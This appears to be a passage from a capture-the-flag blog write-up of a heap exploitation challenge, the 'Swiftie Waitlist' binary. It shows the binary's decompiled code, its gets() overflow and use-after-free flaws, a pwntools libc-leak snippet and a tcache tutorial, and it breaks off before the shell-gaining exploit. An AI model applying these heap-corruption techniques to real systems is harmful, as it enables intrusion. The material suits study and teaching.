@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup] Description Solves: 2
+To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&amp;rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?
+By GovTech
+nc ctf2.whitehats.site 2005
+Initial Analysis $ ./checksec waitlist Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ------ $ ." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#494f5c" />
+<link rel="canonical" href="https://enxgmatic.github.io/ctf/whitehacks/" />
+
+
+    <title>
+        
+            Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup] - enxgmatic&#39;s hidey hole 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.dc79df8e5d2b0bf530399b82a0978f907aadf495688ac75bedb8e2e0d4a2c8a5.css" integrity="sha256-3Hnfjl0rC/UwOZuCoJePkHqt9JVoisdb7bji4NSiyKU=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup]">
+<meta itemprop="description" content="Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup] Description Solves: 2
+To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?
+By GovTech
+nc ctf2.whitehats.site 2005
+Initial Analysis $ ./checksec waitlist Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ------ $ ."><meta itemprop="datePublished" content="2024-03-31T17:43:43+08:00" />
+<meta itemprop="dateModified" content="2024-03-31T17:43:43+08:00" />
+<meta itemprop="wordCount" content="2004">
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup]"/>
+<meta name="twitter:description" content="Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup] Description Solves: 2
+To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?
+By GovTech
+nc ctf2.whitehats.site 2005
+Initial Analysis $ ./checksec waitlist Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ------ $ ."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-03-31 17:43:43 &#43;0800 &#43;08" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">~</span>
+            <span class="logo__text ">
+                $ ./enxgmatic</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/ctf/">CTF Writeups</a></li><li><a href="/about/">About</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title" style="margin-bottom:6px">
+        <a href="https://enxgmatic.github.io/ctf/whitehacks/">Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup]</a>
+      </h1>
+
+      
+
+      <div class="post-info" style="margin-top:6px">
+        
+        
+        
+        
+  
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+            <line x1="16" y1="2" x2="16" y2="6"></line>
+            <line x1="8" y1="2" x2="8" y2="6"></line>
+            <line x1="3" y1="10" x2="21" y2="10"></line>
+          </svg>
+          
+            2024-03-31 17:43 &#43;0800
+          
+  
+           
+            
+          
+        </p>
+
+        <br>
+      </div>
+
+      
+        <hr>
+        <aside id="toc">
+          <div class="toc-title">Table of Contents:</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#initial-analysis">Initial Analysis</a></li>
+    <li><a href="#obtaining-libc-leak">Obtaining libc leak</a></li>
+    <li><a href="#a-short-introduction-to-heap--stuff">A Short Introduction to Heap &amp; Stuff</a></li>
+    <li><a href="#heap-overflow">Heap overflow</a></li>
+    <li><a href="#obtaining-shell">Obtaining Shell</a></li>
+    <li><a href="#full-exploit">Full exploit</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr>
+
+      
+
+      <div class="post-content">
+        <h1 id="whitehacks-2024---the-swiftie-waitlist-pwn-writeup">Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup]</h1>
+<h2 id="description">Description</h2>
+<p><em>Solves: 2</em></p>
+<p>To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?</p>
+<p>By GovTech</p>
+<p><code>nc ctf2.whitehats.site 2005</code></p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./checksec waitlist
+</span></span><span class="line"><span class="cl">Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">Stack:    Canary found
+</span></span><span class="line"><span class="cl">NX:       NX enabled
+</span></span><span class="line"><span class="cl">PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------
+</span></span><span class="line"><span class="cl">$ ./waitlist
+</span></span><span class="line"><span class="cl">Welcome to the ticket portal <span class="k">for</span> the Swiftie concert. Unfortunately, due to overwhelming demand, our tickets are all sold out. However, <span class="k">if</span> you still wish to try <span class="k">for</span> a chance to obtain one, please join our waitlist.
+</span></span><span class="line"><span class="cl">Here is the <span class="nb">exit</span> passcode to leave the waitlist should you change your mind: <span class="m">140456273802736</span>
+</span></span><span class="line"><span class="cl">Options:
+</span></span><span class="line"><span class="cl">1. Join the waitlist
+</span></span><span class="line"><span class="cl">2. View the waitlist
+</span></span><span class="line"><span class="cl">3. Leave the waitlist
+</span></span><span class="line"><span class="cl">4. Exit
+</span></span><span class="line"><span class="cl">&gt;
+</span></span></code></pre></div><p>Decompiling the binary in Ghidra, the <code>main()</code> function simply lets us choose between 3 options: joining the waitlist [<code>add()</code>], viewing the waitlist [<code>delete()</code>] and leaving the waitlist [<code>view()</code>].</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">local_18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">ignore_me_init_buffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;Welcome to the ticket portal for the Swiftie concert. Unfortunately, due to overwhelming dema nd, our tickets are all sold out. However, if you still wish to try for a chance to obtain one , please join our waitlist.&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Here is the exit passcode to leave the waitlist should you change your mind: %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">exit</span><span class="p">);</span> <span class="c1">// leaks the address of exit()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100d18</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/* when we pick option 4, aka exit */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/* prints out the options */</span>
+</span></span><span class="line"><span class="cl">        <span class="n">local_14</span> <span class="o">=</span> <span class="nf">getOption</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/* when we pick option 2, aka to view the waitlist */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Queue #: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100e9c</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">view</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* when we pick option 3, aka leave the waitlist */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="k">goto</span> <span class="n">code_r0x00100c7b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Queue #: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100e9c</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">delete</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* when we pick option 1, aka join the waitlist */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">add</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">LAB_00100d0c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nl">code_r0x00100c7b</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100d0c</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You are not supposed to be here!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">LAB_00100d18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Already, this is pretty reminiscent of a typical Create, View, Edit and Delete heap challenge, though interestingly without an Edit option.</p>
+<p>Additionally, we are given the address of <code>exit()</code>, which means we can obtain the libc base address (since ASLR is enabled).</p>
+<br>
+<p>Let&rsquo;s check out <code>add()</code> first, which runs when we pick option 1 to join the waitlist:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span> <span class="c1">// Allocate a chunk
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span> <span class="c1">// Vulnerable to buffer overflow
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">listSize</span> <span class="o">=</span> <span class="n">listSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You are now in queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">listSize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ERROR: Waitlist is maxed out.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The binary will allocate a fixed size chunk (using <code>malloc(0x18)</code>) to indicate a queue number in the waitlist. The chunk will take on the value of <code>name</code>, which we can control based on our input.</p>
+<figure>
+<img src="assets/waitlist.png">
+<figcaption>In this case, our chunk is allocated to the address `0x555555604260`. Our chunk holds the value `HELLOTHERE`, which is the name that I had input.</figcaption>
+</figure>
+<p>Also to take note, while inputting <code>name</code>, the <code>gets()</code> function is used, which is vulnerable to buffer overflow (sus).</p>
+<p>Afterwards, the pointer to the chunk is added to the waitlist, which is an array of max size 10.</p>
+<figure>
+<img src="assets/waitlist (2).png" width=75%>
+<figcaption>The first element of waitlist holds the value of 0x555555604260, which is the address of the chunk at queue number 0.</figcaption>
+</figure>
+<br>
+<p>Moving on to <code>delete()</code>, which is option 3 (leaving the waitlist):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="n">uint</span> <span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid index!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You have forfeited your queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The function lets us free a chunk, based on the index on the waitlist. However, after freeing, the chunk isn&rsquo;t cleared (the pointer isn&rsquo;t set to NULL).</p>
+<br>
+<p>Finally, let&rsquo;s check out <code>view()</code>, which is option 4 (viewing the waitlist):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">view</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">param_1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="n">param_1</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid index!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[</span><span class="n">param_1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Not much to say, we are able to view the value of a chunk based on the index.</p>
+<h2 id="obtaining-libc-leak">Obtaining libc leak</h2>
+<p>As mentioned above, the binary directly gives us the address of <code>exit()</code>.</p>
+<p>Additionally, libc 2.27 was provided as part of the challenge. Using this, we can calculate the libc base address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;change your mind: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;exit:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">exit</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span></code></pre></div><p>Now&hellip; moving on to the heap stuff :)</p>
+<h2 id="a-short-introduction-to-heap--stuff">A Short Introduction to Heap &amp; Stuff</h2>
+<p>When we use <code>malloc(size)</code> to allocate a chunk, a chunk of size rounded to the next 0x10 will be allocated in the heap.</p>
+<br>
+<p>The chunk consists of 2 parts - the metadata, and the user data:</p>
+<ul>
+<li>The first 0x8 bytes is the <code>mchunk_prev_size</code>
+<ul>
+<li>This only applies if an adjacent chunk is free</li>
+<li>Otherwise, this 0x8 bytes will be used as part of the previous chunk&rsquo;s user data</li>
+</ul>
+</li>
+<li>The next 0x8 bytes represents the size of the chunk <code>mchunk_size</code>
+<ul>
+<li>The last 3 bits are used as &ldquo;flags&rdquo;, which is left as an exercise to the reader to find out</li>
+</ul>
+</li>
+<li>Finally, the rest is user data of the minimum <code>size</code> requested</li>
+</ul>
+<figure class="full">
+  <img src="assets/waitlist (4).png" width=60%>
+  <figcaption class="center">Credits to pwn.college</figcaption>
+</figure>
+<p>Let&rsquo;s demonstrate it for this binary. I have allocated a chunk with the <code>name</code> value: <code>BBBBB</code>.</p>
+<ul>
+<li>Using <code>heap chunks</code> in gdb, we can see that the chunk is at the address 0x555555604260
+<ul>
+<li>Note: this address is where our user data starts (<code>mem_addr</code> in the image above). <code>chunk_addr</code> is 0x555555604260-0x10=0x555555604250.</li>
+</ul>
+</li>
+<li>The green box represents the <code>mchunk_prev_size</code> (not relevant in this case)</li>
+<li>The orange box represents <code>mchunk_size</code>, which is 0x20
+<ul>
+<li>It writes 0x21 due to the abovementioned flags</li>
+</ul>
+</li>
+<li>The red box represents the user data (<code>0x4242424242</code> = <code>BBBBB</code>)</li>
+</ul>
+<figure class="full">
+<img src="assets/waitlist (3).png">
+<figcaption></figcaption>
+</figure>
+<p>What happens when we free the chunk? In this case, the chunk will enter tcache.</p>
+<p>The tcache is a singly linked list. Each tcache entry will point to the next entry in the list (eg in the diagram below, A points to B). When we use <code>malloc</code> to allocate a new chunk, the latest entry that entered tcache will be used (so it is a last-in-first-out LIFO system).</p>
+<figure class="full">
+<img src="assets/waitlist (6).png" width=60%>
+<figcaption>Credits to pwn.college</figcaption>
+</figure>
+<p>Structure of a tcache entry:</p>
+<ul>
+<li>the first 0x8 bytes <code>next</code> is the address of the next entry (or NULL if no next entry)</li>
+<li>the next 0x8 bytes is the <code>key</code> (unimportant here, left as an exercise to the reader)</li>
+</ul>
+<figure class="full">
+<img src="assets/waitlist (5).png" width=60%>
+<figcaption>Credits to pwn.college</figcaption>
+</figure>
+<p>Let&rsquo;s go back to our example using the binary. We free the chunk by choosing option 3 and deleting the queue number 0.</p>
+<p>Going back to the same address, we see that our user data is now gone. Instead, we have:</p>
+<ul>
+<li>The address of the next entry (red box), which is null because there is no next entry.</li>
+<li>The key (green box)</li>
+</ul>
+<figure class="full">
+<img src="assets/waitlist (7).png">
+<figcaption></figcaption>
+</figure>
+<p>Let&rsquo;s try another situation. Restart the binary and join the waitlist twice (queue #0 and queue #1). Then, leave the waitlist for both of them.</p>
+<p>In this case, we allocated 2 chunks and then freed both of them.</p>
+<figure class="full">
+<img src="assets/waitlist (8).png">
+<figcaption>(Prior to leaving the waitlist): Two chunks have been allocated. The first one has value AAAAA and the second one has value BBBBB.</figcaption>
+</figure>
+<p>After leaving the waitlist (ie freeing the chunks), here&rsquo;s the new heap layout:</p>
+<ul>
+<li>The red boxes indicate the next entry, and green boxes indicate the key for each entry</li>
+<li>We can see that for the first entry, the next entry value is null</li>
+<li>However for the second entry, the next entry value is the address of the first entry</li>
+</ul>
+<figure class="full">
+<img src="assets/waitlist (9).png">
+<figcaption></figcaption>
+</figure>
+<p>With this knowledge, how can we exploit this?</p>
+<h2 id="heap-overflow">Heap overflow</h2>
+<p>As mentioned earlier, there is a buffer overflow vulnerability in <code>add()</code> due to <code>gets()</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span> <span class="c1">// Vulnerable to buffer overflow
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">listSize</span> <span class="o">=</span> <span class="n">listSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
